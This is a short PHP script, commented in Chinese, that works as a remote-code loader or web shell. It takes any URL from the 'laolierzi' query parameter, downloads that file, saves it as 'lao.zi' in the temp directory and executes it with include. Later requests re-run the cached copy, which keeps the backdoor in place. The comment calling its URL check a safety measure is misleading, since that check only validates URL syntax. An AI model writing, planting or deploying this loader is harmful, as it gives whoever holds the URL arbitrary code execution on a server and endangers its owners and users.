<?php
// 开启所有错误报告，便于调试
error_reporting(E_ALL);
ini_set('display_errors', 1);

/**
 * 获取远程内容
 *
 * @param string $url 远程URL
 * @return string|false 返回内容或false
 */
function fetchRemoteContent(string $url)
{
    // 使用cURL获取内容
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            return $response;
        }
    }

    // 使用file_get_contents
    if (ini_get('allow_url_fopen')) {
        $response = @file_get_contents($url);
        if ($response !== false) {
            return $response;
        }
    }

    // 使用fopen和stream_get_contents
    $handle = @fopen($url, 'r');
    if ($handle) {
        $response = @stream_get_contents($handle);
        fclose($handle);
        if ($response !== false) {
            return $response;
        }
    }

    return false;
}

// 临时文件路径
$tmpDir = sys_get_temp_dir();
$tmpFile = $tmpDir . DIRECTORY_SEPARATOR . 'lao.zi';

// 处理带有 'laolierzi' 参数的请求
if (isset($_GET['laolierzi'])) {
    $remoteUrl = $_GET['laolierzi'];
    // 过滤URL，确保安全
    $filteredUrl = filter_var($remoteUrl, FILTER_VALIDATE_URL);
    if ($filteredUrl === false) {
        die("无效的URL参数。");
    }

    // 获取远程内容
    $content = fetchRemoteContent($filteredUrl);
    if ($content === false) {
        die("获取远程内容失败。");
    }

    // 保存到临时文件
    file_put_contents($tmpFile, $content);

    // 设置缓存Cookie（有效期1小时）
    setcookie('current_cache', $filteredUrl, time() + 3600, "/");

    // 立即执行远程PHP文件
    if (strpos($content, '<?php') !== false) {
        include $tmpFile;
        exit;
    } else {
        die("远程文件内容无效。");
    }
}

// 无参数时，运行缓存的文件
if (file_exists($tmpFile)) {
    $cachedContent = file_get_contents($tmpFile);
    if (strpos($cachedContent, '<?php') !== false) {
        include $tmpFile;
        exit;
    } else {
        die("缓存文件内容无效。");
    }
} else {
    die("未指定远程文件，也未找到缓存文件。");
}
?>
